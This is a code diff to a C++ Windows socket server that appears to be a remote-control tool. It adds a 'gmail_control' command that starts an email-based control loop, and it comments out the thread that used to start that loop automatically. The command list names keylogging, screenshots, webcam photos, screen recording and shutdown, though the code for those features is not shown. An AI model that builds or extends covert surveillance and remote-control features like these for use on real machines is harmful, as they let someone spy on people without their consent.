@@ -146,24 +146,6 @@ void sendResponse(SOCKET sock, const std::string& msg)
     }
 }
 
-// bool isValidCommand(const std::string& cmd)
-// {
-//     static const std::set<std::string> validCommands = {
-//         "help", "list_services", "start ", "stop ", "list_apps",
-//         "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
-//         "restart", "shutdown", "start_record", "stop_record", "gmail_server"
-//     };
-
-//     for (const auto& validCmd : validCommands)
-//     {
-//         if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
-//         {
-//             return true;
-//         }
-//     }
-//     return false;
-// }
-
 void handleCommand(SOCKET sock, const std::string& cmd)
 {
     if (cmd == "help")
@@ -184,6 +166,7 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  shutdown                - Shutdown the system\n"
             "  start_record            - Start screen recording\n"
             "  stop_record             - Stop screen recording\n"
+            "  gmail_control           - Control by Gmail\n"
             "  exit                    - Disconnect from server\n";
         sendResponse(sock, helpMsg);
     }
@@ -320,6 +303,17 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             sendResponse(sock, msg);
         }
     }
+    else if (cmd == "gmail_control")
+    {
+        std::string msg = "Starting Gmail control loop...";
+        sendResponse(sock, msg);
+        
+        startGmailControlLoop();
+        
+        // After the loop ends, send a final message to the client
+        msg = "Gmail control loop stopped.";
+        sendResponse(sock, msg);
+    }
     else
     {
         std::string msg = "Unknown command: " + cmd;
@@ -360,16 +354,16 @@ int main()
     }
     std::cout << "Client connected." << std::endl;
 
-    // run local Gmail server in a separate thread
-    std::thread gmailThread([&clientSock]() {
-        startGmailControlLoop();
-        // Sau khi vòng lặp kết thúc, gửi thông báo đến client
-        std::string msg = "Gmail control loop stopped.";
-        sendResponse(clientSock, msg);
-        closesocket(clientSock); // Đóng socket client khi kết thúc
-    });
+    // // run local Gmail server in a separate thread
+    // std::thread gmailThread([&clientSock]() {
+    //     startGmailControlLoop();
+    //     // Sau khi vòng lặp kết thúc, gửi thông báo đến client
+    //     std::string msg = "Gmail control loop stopped.";
+    //     sendResponse(clientSock, msg);
+    //     closesocket(clientSock); // Đóng socket client khi kết thúc
+    // });
 
-    gmailThread.detach(); // Detach the thread to run independently
+    // gmailThread.detach(); // Detach the thread to run independently
 
     char buffer[1024];
     while (true)
